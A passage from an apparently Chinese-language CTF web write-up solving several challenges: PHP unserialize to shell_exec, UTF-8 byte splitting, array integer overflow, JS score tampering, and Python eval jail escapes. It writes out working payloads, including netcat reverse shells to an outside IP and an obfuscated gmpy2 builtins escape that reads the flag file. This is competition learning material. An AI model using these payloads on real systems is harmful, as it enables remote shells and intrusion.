function_ invoke__">init</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$serializecmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$unserializecmd</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializecmd</span>);</span><br><span class="line">        <span class="variable">$unserializecmd</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简简单单拉~出题人为了方便还特地装了个nc，开心！<br>构造一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;nc 43.140.251.169 7777 -e sh&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Webshell</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>然后直接就反弹shell了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668871965779-671ecaf1-1333-4df9-9d95-91391ef450d7.png#averageHue=%232a2928&clientId=u4ca489eb-28c7-4&from=paste&height=209&id=u37d04a46&name=image.png&originHeight=261&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19999&status=done&style=none&taskId=ubcff0b4f-829c-4ea9-9599-bf4504b2916&title=&width=744" alt="image.png"></p>
<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872264499-352071e5-6b21-4f7f-98f1-fce5ee975441.png#averageHue=%23f9f9f9&clientId=u4ca489eb-28c7-4&from=paste&height=223&id=u55d9c345&name=image.png&originHeight=279&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28304&status=done&style=none&taskId=u30ba63e3-3e7f-4ab2-b801-ef1ea896df2&title=&width=753.6" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你太长了！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;大牛&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目意思只能说概括的很全面，有一种精灵宝可梦的感觉，给大家一点时间反应一下，猜猜看，遮住下面</p>
<p>那现在就公布答案了：<br>一个英文是占一个字节的，一个中文占3个字节，这一点从URL编码也可以看到，但是我们可能想不到，中文单个字节是乱码，但是两个字节一粘起来就变成了中文：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872705917-426d1807-f80d-4c9c-859f-00e67bceb699.png#averageHue=%23f9f8f7&clientId=u4ca489eb-28c7-4&from=paste&height=170&id=ubee438fc&name=image.png&originHeight=213&originWidth=435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11193&status=done&style=none&taskId=u029968e2-6458-46e6-8c4d-c24d7a504f2&title=&width=348" alt="image.png"><br>最终传参为：<br><code>?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872752029-6a7c6b36-4960-4296-990a-e745976e8ef9.png#averageHue=%239d9d9d&clientId=u4ca489eb-28c7-4&from=paste&height=283&id=u51b67365&name=image.png&originHeight=354&originWidth=995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28553&status=done&style=none&taskId=u5460ba74-b6cb-4791-ab4f-fe43b312dd7&title=&width=796" alt="image.png"></p>
<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><p>意义不明：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668872832815-f178eb5d-0b31-4557-80d3-5e57a2104c63.png#averageHue=%23adadad&clientId=u4ca489eb-28c7-4&from=paste&height=362&id=u8be11bf9&name=image.png&originHeight=453&originWidth=935&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25061&status=done&style=none&taskId=ue44ada74-4501-40e0-838b-045ed948f4c&title=&width=748" alt="image.png"></p>
<h2 id="无一幸免-FIXED"><a href="#无一幸免-FIXED" class="headerlink" title="无一幸免_FIXED"></a>无一幸免_FIXED</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这才对劲，考的是一个数组整形溢出绕过永真：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668873539493-b366afef-d4af-426d-8ee2-eff6dc8dfb9f.png#averageHue=%23fafaf9&clientId=u4ca489eb-28c7-4&from=paste&height=202&id=ua5c1e99e&name=image.png&originHeight=252&originWidth=555&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22680&status=done&style=none&taskId=u4cfcf49c-dde1-4402-a770-76ef1caf400&title=&width=444" alt="image.png"><br>payload：<br><code>?0=9223372036854775807</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668873559935-385905e3-1e40-475d-ade8-7299c59457ee.png#averageHue=%23fcfbfb&clientId=u4ca489eb-28c7-4&from=paste&height=356&id=u43adb4d0&name=image.png&originHeight=445&originWidth=1309&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35933&status=done&style=none&taskId=u052575b2-0aa0-4a0f-a315-33e58532d96&title=&width=1047.2" alt="image.png"><br>可以看到报错也说了是溢出，但是可以绕过</p>
<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>考点：前端js审计<br>嗯，不会！<br>现在再来做一次就感觉恍然大悟了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668873827178-3d139358-2984-4b96-b5e6-83248d559b49.png#averageHue=%23fefefd&clientId=u4ca489eb-28c7-4&from=paste&height=153&id=ueeafd84d&name=image.png&originHeight=191&originWidth=493&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7962&status=done&style=none&taskId=u7b697802-de0f-49c7-bd27-430facc59a4&title=&width=394.4" alt="image.png"><br>可以看到这里有个score变量，题目也说了score大于2077就会输出flag，所以这个东西留个心眼，然后发现了一段：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668873863181-30b83f10-3f7c-4d3c-823b-32fef8aa9340.png#averageHue=%23fcfbfa&clientId=u4ca489eb-28c7-4&from=paste&height=133&id=u45bfc87d&name=image.png&originHeight=166&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14692&status=done&style=none&taskId=u8b39b6b1-a543-417e-bb69-ac6e2c7b4dc&title=&width=524" alt="image.png"><br>js混淆，那就猜测flag肯定在这了，但考点不是反混淆，之后又发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668873883464-fd74d95f-d3a3-4484-a5ac-124cc705eb8a.png#averageHue=%23fdfcfb&clientId=u4ca489eb-28c7-4&from=paste&height=64&id=uf1f6f952&name=image.png&originHeight=80&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5039&status=done&style=none&taskId=u60be8c9d-c7d6-4431-aaac-aef6ae224bf&title=&width=392" alt="image.png"><br>整个游戏是靠着<code>Game = new Underophidian(&#39;gameCanvas&#39;)</code>运行起来的<br>思路就是文件下载到本地来，修改score，直接就得到flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668875464005-5641a704-7d5b-4110-8f43-5f24ca178034.png#averageHue=%23384049&clientId=u4ca489eb-28c7-4&from=paste&height=120&id=u7e5b0bfc&name=image.png&originHeight=150&originWidth=570&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10086&status=done&style=none&taskId=u105536d0-8653-4503-ac19-0d3fc2fc2ef&title=&width=456" alt="image.png"><br>然后就有flag了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668875472244-748023cc-7692-470c-8966-eff1fd7e9ea8.png#averageHue=%23eec288&clientId=u4ca489eb-28c7-4&from=paste&height=225&id=u60dc8562&name=image.png&originHeight=281&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21880&status=done&style=none&taskId=ub9b143f5-1d06-480e-8e18-7679114b5bc&title=&width=694.4" alt="image.png"><br>拖到本地复现还是有点问题的不知道为什么，和wp里还是有点不像</p>
<h2 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h2><p>考点：SSTI？也不算，JAIL题<br>上强度了上强度了，这题写出来还是有成就感的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668875590336-b78670f5-47ea-4d52-b1c9-608724ae64be.png#averageHue=%23f8f8f8&clientId=u4ca489eb-28c7-4&from=paste&height=356&id=uc50d6cdd&name=image.png&originHeight=445&originWidth=1021&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44575&status=done&style=none&taskId=u36adc552-f8da-4712-b20c-fd299145fec&title=&width=816.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914121719-28d677d5-cff3-41cf-a89f-b03d4e658497.png#averageHue=%23f8f6f5&clientId=u62aaed9d-65bf-4&from=paste&height=389&id=u9d6748a4&name=image.png&originHeight=486&originWidth=649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19832&status=done&style=none&taskId=u043a2bc5-0d45-4edb-939d-6c791946610&title=&width=519.2" alt="image.png"><br>一个算术板子，抓包之后可以发现传递了3个参数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914147193-08262156-9656-43bd-9759-ee48c3b3f0a0.png#averageHue=%231b4d84&clientId=u62aaed9d-65bf-4&from=paste&height=47&id=ue140bd8a&name=image.png&originHeight=59&originWidth=1916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20422&status=done&style=none&taskId=u2b50f12b-2849-4cb4-8e10-7a3cbc1e385&title=&width=1532.8" alt="image.png"><br>我们直接在浏览器看看他的报错代码<br>发现了程序执行命令的语句<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914165964-38b0b8de-679d-4835-9845-1c7eb7ef52a4.png#averageHue=%23e2bd79&clientId=u62aaed9d-65bf-4&from=paste&height=79&id=u6976af3a&name=image.png&originHeight=99&originWidth=548&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4083&status=done&style=none&taskId=u2e66bdc8-8f69-4a8e-b96f-c002cf79db6&title=&width=438.4" alt="image.png"><br><code>result = eval(a + operator + b)</code><br>这个a,operator,b对应的就是我们传递的3个参数，这里肯定是存在一个沙盒逃逸的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914210711-0d56010a-25ac-46e1-b7ce-47a9daac0569.png#averageHue=%23f4f4f4&clientId=u62aaed9d-65bf-4&from=paste&height=201&id=ubadda554&name=image.png&originHeight=251&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52105&status=done&style=none&taskId=ua6536210-3108-4aef-aa86-2c38310e4eb&title=&width=988" alt="image.png">可以看到右边报错显示str不能加法，我们开放思维去想象一下，既然他识别了str，那我们能不能进一步尝试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914330160-00c74d0d-a55d-46ea-908a-89bd6a167ace.png#averageHue=%23f4f4f4&clientId=u62aaed9d-65bf-4&from=paste&height=204&id=ua9c9a84f&name=image.png&originHeight=255&originWidth=1199&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51711&status=done&style=none&taskId=u1e363cf3-3ccd-448e-8394-3cd5635e187&title=&width=959.2" alt="image.png"><br>观察到是识别了我们的import的，这边就开始进行一个无回显的反弹shell<br><code>__import__(&#39;os&#39;).system(&#39;nc%2043.140.251.169%206666%20%20-e%20sh%20&#39;)</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914357635-abb5200a-76f3-46d1-a011-ce3c77677e85.png#averageHue=%23353333&clientId=u62aaed9d-65bf-4&from=paste&height=71&id=u26eba737&name=image.png&originHeight=89&originWidth=588&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4960&status=done&style=none&taskId=ubf611653-aeb5-46f1-b9ee-70f517efd75&title=&width=470.4" alt="image.png"></p>
<h2 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h2><p>给了源码，成白盒测试了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：算力升级--这其实是一个pyjail题目</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re,gmpy2 </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pattern=re. (<span class="string">r&#x27;\w+&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#从code里把单词拿出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#如果不是数字</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#逐个和gmpy2库里的函数名比较</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;你想干什么？<span class="subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;计算成功，答案是<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>大概的逻辑就是把我们传递参数，做一个判断，如果参数里的单词是在gmpy2库里的话，就会通过，反之拦截<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914794383-b18a1c55-7096-45a2-bc89-d70f319e2c9d.png#averageHue=%23729d93&clientId=u62aaed9d-65bf-4&from=paste&height=425&id=u9782ea39&name=image.png&originHeight=531&originWidth=1399&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38139&status=done&style=none&taskId=u9d25a3b5-8d63-425d-9e91-75eb14a399c&title=&width=1119.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914802276-f44cefff-ecdd-4996-b138-7ad68c167f22.png#averageHue=%23f8f5f3&clientId=u62aaed9d-65bf-4&from=paste&height=54&id=ub5e1f987&name=image.png&originHeight=67&originWidth=1168&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22103&status=done&style=none&taskId=u1327febe-48b0-4a6a-9ac6-0ce8dbec989&title=&width=934.4" alt="image.png"><br>re库是用来进行正则判断的，稍微了解一下就好<br>我们可以在本地看看gmpy2库有哪些函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668914854479-01d3280c-7efd-4a53-bae8-7e868dafcfb1.png#averageHue=%232b2b2b&clientId=u62aaed9d-65bf-4&from=paste&height=384&id=ufa44c051&name=image.png&originHeight=480&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45868&status=done&style=none&taskId=uf8649098-9914-4834-9330-1be84fd1348&title=&width=777.6" alt="image.png"><br>就是一些很普通的算法函数，这里的思路和自增很相似，<code>&#39;abc&#39;[0]</code>截取出的就是a，根据这个思路，相信大家都知道该怎么做了吧，就是截取可用字符的特定字母，这里就需要写一个脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:@Boogipop</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">dirtystr=<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&quot;</span></span><br><span class="line">payload=<span class="string">&quot;gmpy2.__builtins__[&#x27;sech&#x27;[1]+&#x27;invert&#x27;[2]+&#x27;acos&#x27;[0]+&#x27;bit_flip&#x27;[5]](&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dirtystr:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;/&#x27;().01234567*89&amp;&lt;&gt;: &quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> j:</span><br><span class="line">                payload+=<span class="string">f&quot;&#x27;<span class="subst">&#123;j&#125;</span>&#x27;[<span class="subst">&#123;j.find(i)&#125;</span>]+&quot;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload +=<span class="string">f&quot;\&quot;<span class="subst">&#123;i&#125;</span>\&quot;+&quot;</span></span><br><span class="line">payload=payload[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将生成的payload放入即可！自己写脚本感觉真爽<br><code>gmpy2.__builtins__[&#39;sech&#39;[1]+&#39;invert&#39;[2]+&#39;acos&#39;[0]+&#39;bit_flip&#39;[5]](&#39;HAVE_THREADS&#39;[4]+&#39;HAVE_THREADS&#39;[4]+&#39;DivisionByZeroError&#39;[1]+&#39;__name__&#39;[4]+&#39;InvalidOperationError&#39;[8]+&#39;DivisionByZeroError&#39;[6]+&#39;DivisionByZeroError&#39;[12]+&#39;Default&#39;[6]+&#39;HAVE_THREADS&#39;[4]+&#39;HAVE_THREADS&#39;[4]+&quot;(&quot;+&quot;&#39;&quot;+&#39;DivisionByZeroError&#39;[6]+&#39;DivisionByZeroError&#39;[4]+&quot;&#39;&quot;+&quot;)&quot;+&quot;.&quot;+&#39;InvalidOperationError&#39;[8]+&#39;DivisionByZeroError&#39;[6]+&#39;InvalidOperationError&#39;[8]+&#39;Default&#39;[1]+&#39;DivisionByZeroError&#39;[7]+&quot;(&quot;+&quot;&#39;&quot;+&#39;InexactResultError&#39;[5]+&#39;Default&#39;[3]+&#39;Default&#39;[6]+&quot; &quot;+&quot;/&quot;+&#39;Default&#39;[2]+&quot;*&quot;+&quot;&#39;&quot;+&quot;)&quot;+&quot;.&quot;+&#39;DivisionByZeroError&#39;[12]+&#39;Default&#39;[1]+&#39;Default&#39;[3]+&#39;InvalidOperationError&#39;[6]+&quot;(&quot;+&quot;)&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668918862385-5ebd9810-1298-4e7c-a294-f390b02022ce.png#averageHue=%23cac9c8&clientId=ubb9ab657-d2cd-4&from=paste&height=193&id=u13eeed1c&name=image.png&originHeight=241&originWidth=1506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66145&status=done&style=none&taskId=uac1c7475-f54f-421f-8571-72febf35b16&title=&width=1204.8" alt="image.png"><br>欧克了</p>
<h2 id="easyPytHon-P"><a href="#easyPytHon-P" class="headerlink" title="easyPytHon_P"></a>easyPytHon_P</h2><p>要说的话这题才是纸老虎吧<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668919507213-2dfb81d3-7fbb-4c15-8acc-558d119db0ed.png#averageHue=%23fbfaf9&clientId=ubb9ab657-d2cd-4&from=paste&height=681&id=u1ecb547c&name=image.png&originHeight=851&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115329&status=done&style=none&taskId=ud2c206ab-4a31-46fc-b93a-6302b32076c&title=&width=1532" alt="image.png"><br>好裸露的源码，重点放在<code>subprocess.run</code>函数，我们google一下：</p>
